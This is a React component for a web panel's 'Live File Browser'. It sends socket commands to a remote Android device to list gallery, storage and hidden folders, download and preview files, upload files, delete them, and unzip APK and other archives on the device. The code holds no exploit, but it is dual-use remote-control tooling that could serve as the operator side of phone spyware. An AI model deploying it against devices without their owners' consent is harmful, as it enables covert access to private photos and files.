"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { toast } from "sonner";
import {
  FiChevronLeft,
  FiChevronRight,
  FiDownload,
  FiEye,
  FiFile,
  FiFolder,
  FiImage,
  FiMusic,
  FiPackage,
  FiRefreshCw,
  FiTrash2,
  FiUpload,
  FiVideo,
  FiX,
} from "react-icons/fi";
import { Device } from "../../../types/device-types";

type FileEntry = {
  name: string;
  size: number;
  isDir: boolean;
  modified?: number | string | null;
  type?: string;
};

type SourceMode = "gallery" | "files" | "hidden";

interface LiveFileBrowserProps {
  device: Device;
  socket: any;
}

const PAGE_SIZE = 50;

const formatBytes = (bytes: number) => {
  if (!bytes || bytes <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB", "TB"];
  const index = Math.min(
    Math.floor(Math.log(bytes) / Math.log(1024)),
    units.length - 1
  );
  return `${(bytes / Math.pow(1024, index)).toFixed(index === 0 ? 0 : 1)} ${
    units[index]
  }`;
};

const formatDate = (raw: number | string | null | undefined) => {
  if (!raw) return "-";
  try {
    const n = typeof raw === "string" ? Number(raw) : raw;
    const d = Number.isFinite(n) ? new Date(n) : new Date(raw);
    if (Number.isNaN(d.getTime())) return String(raw);
    return d.toLocaleString();
  } catch {
    return String(raw);
  }
};

const fileIcon = (entry: FileEntry) => {
  if (entry.isDir) return FiFolder;
  const t = (entry.type || "").toLowerCase();
  if (t.startsWith("image/") || t === "image" || /\.(jpe?g|png|gif|webp|bmp|svg|heic|heif|avif)$/i.test(entry.name))
    return FiImage;
  if (t.startsWith("video/") || t === "video" || /\.(mp4|mkv|avi|mov|3gp|webm|flv|wmv|m4v)$/i.test(entry.name))
    return FiVideo;
  if (t.startsWith("audio/") || t === "audio" || /\.(mp3|wav|ogg|flac|m4a|aac|wma)$/i.test(entry.name))
    return FiMusic;
  if (/\.(zip|rar|7z|tar|gz|bz2)$/i.test(entry.name)) return FiFile;
  if (/\.(pdf|doc|docx|txt|md|rtf)$/i.test(entry.name)) return FiFile;
  if (/\.(apk|exe|bin)$/i.test(entry.name)) return FiFile;
  return FiFile;
};

const typeBadge = (entry: FileEntry) => {
  if (entry.isDir) return { label: "folder", className: "bg-yellow-900/40 text-yellow-300" };
  const t = (entry.type || "").toLowerCase();
  if (t.startsWith("image/") || t === "image" || /\.(jpe?g|png|gif|webp|bmp|svg|heic|heif|avif)$/i.test(entry.name))
    return { label: "image", className: "bg-emerald-900/40 text-emerald-300" };
  if (t.startsWith("video/") || t === "video" || /\.(mp4|mkv|avi|mov|3gp|webm|flv|wmv|m4v)$/i.test(entry.name))
    return { label: "video", className: "bg-purple-900/40 text-purple-300" };
  if (t.startsWith("audio/") || t === "audio" || /\.(mp3|wav|ogg|flac|m4a|aac|wma)$/i.test(entry.name))
    return { label: "audio", className: "bg-sky-900/40 text-sky-300" };
  if (/\.(zip|rar|7z|tar|gz|bz2)$/i.test(entry.name)) return { label: "archive", className: "bg-amber-900/40 text-amber-300" };
  if (/\.(apk)$/i.test(entry.name)) return { label: "apk", className: "bg-rose-900/40 text-rose-300" };
  return { label: "file", className: "bg-gray-700 text-gray-300" };
};

const isPreviewable = (entry: FileEntry) => {
  if (entry.isDir) return false;
  return (
    /\.(jpe?g|png|gif|webp|bmp|svg)$/i.test(entry.name) ||
    (entry.type || "").toLowerCase().startsWith("image/")
  );
};

const isHiddenFile = (name: string) => name.startsWith(".");

const newSocketId = () =>
  `${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;

const ROOTS: Record<SourceMode, string> = {
  gallery: "/sdcard/DCIM",
  files: "/sdcard",
  hidden: "/sdcard/.hidden",
};

export default function LiveFileBrowser({ device, socket }: LiveFileBrowserProps) {
  const [source, setSource] = useState<SourceMode>("gallery");
  const [path, setPath] = useState<string>(ROOTS.gallery);
  const [page, setPage] = useState<number>(1);
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState<boolean>(false);
  const [error, setError] = useState<string | null>(null);
  const [activeSocketId, setActiveSocketId] = useState<string | null>(null);
  const [downloading, setDownloading] = useState<{ name: string; progress: number } | null>(null);
  const [preview, setPreview] = useState<{ url: string; name: string; mime: string } | null>(null);
  const [uploading, setUploading] = useState<{ name: string; progress: number } | null>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const downloadTimeoutRef = useRef<number | null>(null);

  // chunk assembly refs survive re-renders
  const chunkBufferRef = useRef<Record<number, string>>({});
  const chunkMetaRef = useRef<{
    socketId: string;
    totalChunks: number;
    mime: string;
    name: string;
  } | null>(null);

  const isOnline = !!device?.status && !!device?.socketId;

  // Reset to root + first page when source changes
  useEffect(() => {
    setPath(ROOTS[source]);
    setPage(1);
    setFiles([]);
    setError(null);
  }, [source]);

  // Clear stale errors and the active download when the user navigates.
  useEffect(() => {
    setError(null);
    setDownloading(null);
    chunkBufferRef.current = {};
    chunkMetaRef.current = null;
    if (downloadTimeoutRef.current != null) {
      window.clearTimeout(downloadTimeoutRef.current);
      downloadTimeoutRef.current = null;
    }
  }, [path, source]);

  const requestFileList = useCallback(
    (nextPath: string, nextPage: number) => {
      if (!socket || !isOnline) {
        setError("Device is offline");
        return;
      }
      const sid = newSocketId();
      setActiveSocketId(sid);
      setLoading(true);
      setError(null);

      // Register the panel's socketId with the server so the device's
      // file_list_result can be routed back to this exact panel connection.
      socket.emit("register_panel_request", {
        socketId: sid,
        panelSocketId: socket.id,
      });

      socket.emit("server_command_to_user", {
        socketId: sid,
        toClient: device.socketId,
        user_id: device.userId,
        device_id: device.deviceId,
        from: "panel",
        type: "server_command",
        action: "file-list",
        path: nextPath,
        source,
        page: nextPage,
        pageSize: PAGE_SIZE,
        command: {
          action: "file-list",
          path: nextPath,
          source,
          page: nextPage,
          pageSize: PAGE_SIZE,
        },
        extra: { socketId: sid },
      });
    },
    [socket, device, isOnline, source]
  );

  // Re-fetch when path or page changes
  useEffect(() => {
    if (!socket || !isOnline) return;
    requestFileList(path, page);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [socket, isOnline, path, page, source]);

  // Listen for results
  useEffect(() => {
    if (!socket) return;

    const onListResult = (payload: any) => {
      try {
        if (!payload || payload.socketId !== activeSocketId) return;
        if (payload.error) {
          setError(payload.error);
          setFiles([]);
        } else {
          const list: FileEntry[] = Array.isArray(payload.files)
            ? payload.files
            : [];
          setFiles(list);
          setError(null);
        }
      } catch (e) {
        setError("Failed to parse file list");
      } finally {
        setLoading(false);
        setActiveSocketId(null);
      }
    };

    const onFileData = (payload: any) => {
      if (!payload || !payload.socketId) return;
      const targetSid = chunkMetaRef.current?.socketId;
      // If we're not actively downloading, ignore
      if (!targetSid) return;
      if (payload.socketId !== targetSid) return;

      // First chunk arrived — clear the download timeout
      if (downloadTimeoutRef.current != null) {
        window.clearTimeout(downloadTimeoutRef.current);
        downloadTimeoutRef.current = null;
      }

      // Lazy init on first chunk
      if (!chunkMetaRef.current || chunkMetaRef.current.totalChunks === 0) {
        chunkMetaRef.current = {
          socketId: payload.socketId,
          totalChunks: payload.totalChunks || 1,
          mime: payload.mime || "application/octet-stream",
          name: (payload.path || "download").split("/").pop() || "download",
        };
      }

      const meta = chunkMetaRef.current!;
      const chunkIdx = typeof payload.chunk === "number" ? payload.chunk : 0;
      chunkBufferRef.current[chunkIdx] = payload.data || "";

      const total = meta.totalChunks || 1;
      const received = Object.keys(chunkBufferRef.current).length;
      setDownloading({ name: meta.name, progress: Math.round((received / total) * 100) });

      if (received >= total) {
        // assemble in order
        const chunks: string[] = [];
        for (let i = 0; i < total; i++) {
          chunks.push(chunkBufferRef.current[i] || "");
        }
        const b64 = chunks.join("");
        try {
          const byteStr = atob(b64);
          const len = byteStr.length;
          const bytes = new Uint8Array(len);
          for (let i = 0; i < len; i++) bytes[i] = byteStr.charCodeAt(i);
          const blob = new Blob([bytes], { type: meta.mime });
          const url = URL.createObjectURL(blob);

          if (isPreviewable({ name: meta.name, isDir: false, size: len, type: meta.mime } as any)) {
            setPreview({ url, name: meta.name, mime: meta.mime });
          } else {
            const a = document.createElement("a");
            a.href = url;
            a.download = meta.name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            setTimeout(() => URL.revokeObjectURL(url), 1000);
            toast.success(`Downloaded ${meta.name}`);
          }
        } catch (e) {
          toast.error("Failed to assemble file");
        } finally {
          chunkBufferRef.current = {};
          chunkMetaRef.current = null;
          setDownloading(null);
        }
      }
    };

    socket.on("file_list_result", onListResult);
    socket.on("file_data", onFileData);

    const onDeleteResult = (payload: any) => {
      if (!payload) return;
      if (payload.deleted) {
        toast.success(`Deleted ${payload.path || "file"}`);
        requestFileList(path, page);
      } else {
        // Refresh the listing so the UI matches reality; the device's
        // storage may differ from what we last cached.
        toast.error(
          `Delete failed: ${payload.error || "unknown"} — refreshing list`
        );
        requestFileList(path, page);
      }
    };

    const onUploadResult = (payload: any) => {
      if (!payload) return;
      if (payload.uploaded) {
        toast.success(`Uploaded ${payload.path} (${payload.size || 0} bytes)`);
      } else {
        toast.error(`Upload failed: ${payload.error || "unknown"}`);
      }
    };

    const onUnzipResult = (payload: any) => {
      if (!payload) return;
      if (payload.unzipped) {
        toast.success(
          `Unzipped ${payload.files ?? 0} file${
            payload.files === 1 ? "" : "s"
          } from ${payload.path || "archive"}`
        );
        // Refresh listing so newly extracted files appear
        requestFileList(path, page);
      } else {
        toast.error(
          `Unzip failed: ${payload.error || "unknown"} — refreshing list`
        );
        requestFileList(path, page);
      }
    };

    socket.on("file_delete_result", onDeleteResult);
    socket.on("file_upload_result", onUploadResult);
    socket.on("unzip_result", onUnzipResult);

    return () => {
      socket.off("file_list_result", onListResult);
      socket.off("file_data", onFileData);
      socket.off("file_delete_result", onDeleteResult);
      socket.off("file_upload_result", onUploadResult);
      socket.off("unzip_result", onUnzipResult);
    };
  }, [socket, activeSocketId]);

  const navigateInto = (entry: FileEntry) => {
    if (!entry.isDir) return;
    const next = `${path}/${entry.name}`.replace(/\/+/g, "/");
    setPath(next);
    setPage(1);
  };

  const navigateUp = () => {
    if (path === ROOTS[source]) return;
    const parts = path.split("/").filter(Boolean);
    parts.pop();
    const next = parts.length ? `/${parts.join("/")}` : "/";
    setPath(next);
    setPage(1);
  };

  const downloadFile = (entry: FileEntry) => {
    if (!socket || !isOnline) {
      toast.error("Device is offline");
      return;
    }
    if (entry.isDir) return;

    chunkBufferRef.current = {};
    chunkMetaRef.current = null;

    const sid = newSocketId();
    chunkMetaRef.current = {
      socketId: sid,
      totalChunks: 0,
      mime: entry.type || "application/octet-stream",
      name: entry.name,
    };

    setDownloading({ name: entry.name, progress: 0 });

    // Timeout: if no chunk arrives within 20s, give up and clear the
    // stuck "Downloading — 0%" state so the UI doesn't appear frozen.
    const timeoutId = window.setTimeout(() => {
      if (chunkMetaRef.current?.socketId === sid) {
        chunkBufferRef.current = {};
        chunkMetaRef.current = null;
        setDownloading(null);
        toast.error(`Download timed out: ${entry.name} (device did not respond)`);
      }
    }, 20000);
    downloadTimeoutRef.current = timeoutId;

    socket.emit("register_panel_request", {
      socketId: sid,
      panelSocketId: socket.id,
    });

    socket.emit("server_command_to_user", {
      socketId: sid,
      toClient: device.socketId,
      user_id: device.userId,
      device_id: device.deviceId,
      from: "panel",
      type: "server_command",
      action: "file-read",
      path: `${path}/${entry.name}`,
      command: {
        action: "file-read",
        path: `${path}/${entry.name}`,
      },
      extra: { socketId: sid },
    });
  };

  const deleteEntry = (entry: FileEntry) => {
    if (!socket || !isOnline) {
      toast.error("Device is offline");
      return;
    }
    if (!window.confirm(`Delete ${entry.isDir ? "folder" : "file"} "${entry.name}" on the device?`)) {
      return;
    }
    const sid = newSocketId();

    socket.emit("register_panel_request", {
      socketId: sid,
      panelSocketId: socket.id,
    });

    socket.emit("server_command_to_user", {
      socketId: sid,
      toClient: device.socketId,
      user_id: device.userId,
      device_id: device.deviceId,
      from: "panel",
      type: "server_command",
      action: "file-delete",
      path: `${path}/${entry.name}`,
      command: {
        action: "file-delete",
        path: `${path}/${entry.name}`,
      },
      extra: { socketId: sid },
    });
    toast.info(`Deleting ${entry.name}...`);
  };

  const unzipEntry = (entry: FileEntry) => {
    if (!socket || !isOnline) {
      toast.error("Device is offline");
      return;
    }
    if (entry.isDir) return;
    if (!/\.(zip|jar|war|apk)$/i.test(entry.name)) {
      toast.error("Only zip/jar/war/apk archives can be unzipped");
      return;
    }
    if (
      !window.confirm(
        `Unzip "${entry.name}" into the current directory on the device?`
      )
    ) {
      return;
    }
    const sid = newSocketId();

    // Re-register right before the command in case the entry expired
    // (5-min TTL) or the panel reconnected since a prior request.
    socket.emit("register_panel_request", {
      socketId: sid,
      panelSocketId: socket.id,
    });

    socket.emit("server_command_to_user", {
      socketId: sid,
      toClient: device.socketId,
      user_id: device.userId,
      device_id: device.deviceId,
      from: "panel",
      type: "server_command",
      action: "unzip-file",
      path: `${path}/${entry.name}`,
      command: {
        action: "unzip-file",
        path: `${path}/${entry.name}`,
      },
      extra: { socketId: sid },
    });
    toast.info(`Unzipping ${entry.name}...`);
  };

  const readFileAsBase64 = (file: File): Promise<{ b64: string; size: number; mime: string; name: string }> =>
    new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onerror = () => reject(new Error("Failed to read file"));
      reader.onload = () => {
        const result = reader.result as string;
        const commaIdx = result.indexOf(",");
        const b64 = commaIdx >= 0 ? result.slice(commaIdx + 1) : result;
        resolve({ b64, size: file.size, mime: file.type || "application/octet-stream", name: file.name });
      };
      reader.readAsDataURL(file);
    });

  const handleUploadClick = () => {
    if (!socket || !isOnline) {
      toast.error("Device is offline");
      return;
    }
    fileInputRef.current?.click();
  };

  const handleFileChosen = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    e.target.value = ""; // allow re-selecting the same file
    if (!file || !socket || !isOnline) return;

    try {
      setUploading({ name: file.name, progress: 10 });
      const { b64, size } = await readFileAsBase64(file);
      setUploading({ name: file.name, progress: 50 });

      const sid = newSocketId();
      const remotePath = `${path}/${file.name}`.replace(/\/+/g, "/");

      socket.emit("register_panel_request", {
        socketId: sid,
        panelSocketId: socket.id,
      });

      socket.emit("server_command_to_user", {
        socketId: sid,
        toClient: device.socketId,
        user_id: device.userId,
        device_id: device.deviceId,
        from: "panel",
        type: "server_command",
        action: "file-upload",
        path: remotePath,
        data: b64,
        command: {
          action: "file-upload",
          path: remotePath,
          data: b64,
        },
        extra: { socketId: sid, size },
      });

      setUploading({ name: file.name, progress: 90 });
      toast.success(`Uploaded ${file.name} to ${remotePath}`);
      // Refresh the listing after a short delay
      setTimeout(() => {
        setUploading(null);
        requestFileList(path, page);
      }, 1200);
    } catch (err: any) {
      toast.error(`Upload failed: ${err?.message || "unknown"}`);
      setUploading(null);
    }
  };

  const breadcrumbParts = useMemo(() => {
    const label = source === "gallery" ? "Gallery" : source === "files" ? "Files" : "Hidden";
    if (path === ROOTS[source]) return [label];
    const rel = path.replace(ROOTS[source], "").split("/").filter(Boolean);
    return [label, ...rel];
  }, [path, source]);

  const totalPages = Math.max(1, Math.ceil(files.length / PAGE_SIZE));
  const pagedFiles = files; // device is expected to do per-page slicing; we still cap UI

  return (
    <div className="lg:col-span-3 bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
      <div className="px-5 py-4 border-b border-gray-700 flex flex-col md:flex-row md:items-center md:justify-between gap-3">
        <div>
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <FiFolder className="text-indigo-400" /> Live File Browser
          </h2>
          <p className="text-xs text-gray-400 mt-1">
            Browse and download files directly from {device.modelName}.
          </p>
        </div>
        <div className="flex items-center gap-2">
          <input
            ref={fileInputRef}
            type="file"
            className="hidden"
            onChange={handleFileChosen}
          />
          <button
            onClick={handleUploadClick}
            disabled={loading || !isOnline || !!uploading}
            className="px-3 py-2 rounded-lg bg-emerald-700 text-white hover:bg-emerald-600 disabled:opacity-50 flex items-center gap-2 text-sm"
          >
            <FiUpload /> Upload here
          </button>
          <button
            onClick={() => requestFileList(path, page)}
            disabled={loading || !isOnline}
            className="px-3 py-2 rounded-lg bg-gray-700 text-gray-200 hover:bg-gray-600 disabled:opacity-50 flex items-center gap-2 text-sm"
          >
            <FiRefreshCw className={loading ? "animate-spin" : ""} /> Refresh
          </button>
        </div>
      </div>

      <div className="px-5 py-3 border-b border-gray-700 flex flex-col md:flex-row md:items-center md:justify-between gap-3">
        <div className="flex flex-wrap gap-2">
          {(
            [
              { key: "gallery", label: "Gallery" },
              { key: "files", label: "Files" },
              { key: "hidden", label: "Hidden" },
            ] as { key: SourceMode; label: string }[]
          ).map((tab) => (
            <button
              key={tab.key}
              onClick={() => setSource(tab.key)}
              className={`px-3 py-1.5 rounded-full text-sm transition-colors ${
                source === tab.key
                  ? "bg-indigo-600 text-white"
                  : "bg-gray-700 text-gray-300 hover:bg-gray-600"
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        <nav className="flex flex-wrap items-center gap-1 text-sm">
          {breadcrumbParts.map((part, idx) => (
            <span key={idx} className="flex items-center gap-1">
              {idx > 0 && <span className="text-gray-500">/</span>}
              <span
                className={
                  idx === breadcrumbParts.length - 1
                    ? "text-white"
                    : "text-indigo-300"
                }
              >
                {part}
              </span>
            </span>
          ))}
        </nav>
      </div>

      {!isOnline && (
        <div className="px-5 py-3 bg-yellow-900/30 border-b border-yellow-800 text-yellow-200 text-sm">
          Device is offline. File browsing and downloads are unavailable.
        </div>
      )}

      {downloading && (
        <div className="px-5 py-2 bg-indigo-900/30 border-b border-indigo-800 text-indigo-200 text-sm flex items-center gap-2">
          <FiDownload className="animate-pulse" />
          <span>
            Downloading <span className="font-medium">{downloading.name}</span> — {downloading.progress}%
          </span>
        </div>
      )}

      {uploading && (
        <div className="px-5 py-2 bg-emerald-900/30 border-b border-emerald-800 text-emerald-200 text-sm flex items-center gap-2">
          <FiUpload className="animate-pulse" />
          <span>
            Uploading <span className="font-medium">{uploading.name}</span> — {uploading.progress}%
          </span>
        </div>
      )}

      <div className="p-5">
        {error && (
          <div className="bg-red-900/30 border border-red-700 text-red-300 rounded-lg p-3 text-sm flex items-center gap-2">
            <FiX /> {error}
          </div>
        )}

        {loading && (
          <div className="flex items-center justify-center py-12 text-gray-400">
            <FiRefreshCw className="animate-spin mr-2" /> Loading files...
          </div>
        )}

        {!loading && !error && files.length === 0 && (
          <div className="text-center py-12 text-gray-400 border border-dashed border-gray-700 rounded-xl">
            <FiFolder className="mx-auto mb-3 text-3xl text-gray-500" />
            <p>No files in this directory.</p>
            <p className="text-xs mt-1">Try navigating to a different folder.</p>
          </div>
        )}

        {!loading && files.length > 0 && (
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="text-left text-gray-400 border-b border-gray-700">
                  <th className="py-2 px-3 font-medium">Name</th>
                  <th className="py-2 px-3 font-medium">Type</th>
                  <th className="py-2 px-3 font-medium">Size</th>
                  <th className="py-2 px-3 font-medium">Modified</th>
                  <th className="py-2 px-3 font-medium text-right">Actions</th>
                </tr>
              </thead>
              <tbody>
                {pagedFiles.map((entry, idx) => {
                  const Icon = fileIcon(entry);
                  const badge = typeBadge(entry);
                  const previewable = isPreviewable(entry);
                  const handleNameClick = () => {
                    if (entry.isDir) {
                      navigateInto(entry);
                    } else if (previewable) {
                      downloadFile(entry);
                    } else {
                      downloadFile(entry);
                    }
                  };
                  return (
                    <tr
                      key={`${entry.name}-${idx}`}
                      className="border-b border-gray-800 hover:bg-gray-800/50"
                    >
                      <td className="py-2 px-3">
                        <button
                          onClick={handleNameClick}
                          disabled={!isOnline}
                          className="flex items-center gap-2 text-left text-white hover:text-indigo-300 disabled:opacity-50 group"
                          title={
                            entry.isDir
                              ? "Open folder"
                              : previewable
                              ? "Click to preview"
                              : "Click to download"
                          }
                        >
                          <Icon
                            className={
                              entry.isDir
                                ? "text-yellow-400"
                                : previewable
                                ? "text-emerald-400 group-hover:text-emerald-300"
                                : "text-indigo-400"
                            }
                          />
                          <span
                            className={`truncate max-w-xs ${
                              isHiddenFile(entry.name) ? "italic text-gray-300" : ""
                            }`}
                            title={entry.name}
                          >
                            {entry.name}
                          </span>
                        </button>
                      </td>
                      <td className="py-2 px-3">
                        <span
                          className={`inline-block px-2 py-0.5 rounded text-xs font-medium ${badge.className}`}
                        >
                          {badge.label}
                        </span>
                      </td>
                      <td className="py-2 px-3 text-gray-300">
                        {entry.isDir ? "-" : formatBytes(entry.size)}
                      </td>
                      <td className="py-2 px-3 text-gray-400">
                        {formatDate(entry.modified)}
                      </td>
                      <td className="py-2 px-3 text-right">
                        <div className="flex items-center justify-end gap-2">
                          {entry.isDir ? (
                            <button
                              onClick={() => navigateInto(entry)}
                              disabled={!isOnline}
                              className="px-2 py-1 rounded bg-gray-700 hover:bg-gray-600 text-xs text-gray-200 disabled:opacity-50"
                            >
                              Open
                            </button>
                          ) : (
                            <button
                              onClick={() => downloadFile(entry)}
                              disabled={!isOnline || !!downloading}
                              className="px-2 py-1 rounded bg-indigo-700 hover:bg-indigo-600 text-xs text-white disabled:opacity-50 flex items-center gap-1"
                            >
                              {previewable ? <FiEye /> : <FiDownload />}
                              {previewable ? "Preview" : "Download"}
                            </button>
                          )}
                          {!entry.isDir && /\.(zip|jar|war|apk)$/i.test(entry.name) && (
                            <button
                              onClick={() => unzipEntry(entry)}
                              disabled={!isOnline}
                              className="px-2 py-1 rounded bg-amber-700 hover:bg-amber-600 text-xs text-white disabled:opacity-50 flex items-center gap-1"
                              title="Unzip into the current directory on the device"
                            >
                              <FiPackage /> Unzip
                            </button>
                          )}
                          <button
                            onClick={() => deleteEntry(entry)}
                            disabled={!isOnline}
                            className="px-2 py-1 rounded bg-red-700 hover:bg-red-600 text-xs text-white disabled:opacity-50 flex items-center gap-1"
                            title="Delete on device"
                          >
                            <FiTrash2 /> Delete
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        )}
      </div>

      <div className="px-5 py-3 border-t border-gray-700 flex items-center justify-between text-sm text-gray-400">
        <button
          onClick={navigateUp}
          disabled={path === ROOTS[source]}
          className="px-3 py-1.5 rounded bg-gray-700 hover:bg-gray-600 disabled:opacity-40 disabled:cursor-not-allowed flex items-center gap-1"
        >
          <FiChevronLeft /> Up
        </button>
        <span>
          Page {page} of {totalPages} · {files.length} items
        </span>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setPage((p) => Math.max(1, p - 1))}
            disabled={page <= 1}
            className="px-2 py-1.5 rounded bg-gray-700 hover:bg-gray-600 disabled:opacity-40 disabled:cursor-not-allowed"
          >
            <FiChevronLeft />
          </button>
          <button
            onClick={() => setPage((p) => p + 1)}
            disabled={page >= totalPages}
            className="px-2 py-1.5 rounded bg-gray-700 hover:bg-gray-600 disabled:opacity-40 disabled:cursor-not-allowed"
          >
            <FiChevronRight />
          </button>
        </div>
      </div>

      {preview && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4">
          <div className="bg-gray-900 border border-gray-700 rounded-xl max-w-4xl w-full max-h-[90vh] overflow-hidden">
            <div className="px-4 py-3 border-b border-gray-700 flex items-center justify-between">
              <div className="min-w-0">
                <h3 className="text-white font-medium truncate flex items-center gap-2">
                  <FiEye className="text-indigo-400" /> {preview.name}
                </h3>
                <p className="text-xs text-gray-400">{preview.mime}</p>
              </div>
              <button
                onClick={() => {
                  URL.revokeObjectURL(preview.url);
                  setPreview(null);
                }}
                className="p-2 rounded hover:bg-gray-800"
              >
                <FiX />
              </button>
            </div>
            <div className="p-4 max-h-[70vh] overflow-auto flex items-center justify-center bg-black">
              <img
                src={preview.url}
                alt={preview.name}
                className="max-w-full max-h-[65vh] object-contain"
              />
            </div>
            <div className="px-4 py-3 border-t border-gray-700 flex justify-end gap-2">
              <a
                href={preview.url}
                download={preview.name}
                className="px-3 py-1.5 rounded bg-indigo-600 hover:bg-indigo-700 text-white text-sm flex items-center gap-1"
              >
                <FiDownload /> Download
              </a>
              <button
                onClick={() => {
                  URL.revokeObjectURL(preview.url);
                  setPreview(null);
                }}
                className="px-3 py-1.5 rounded bg-gray-700 hover:bg-gray-600 text-gray-200 text-sm"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
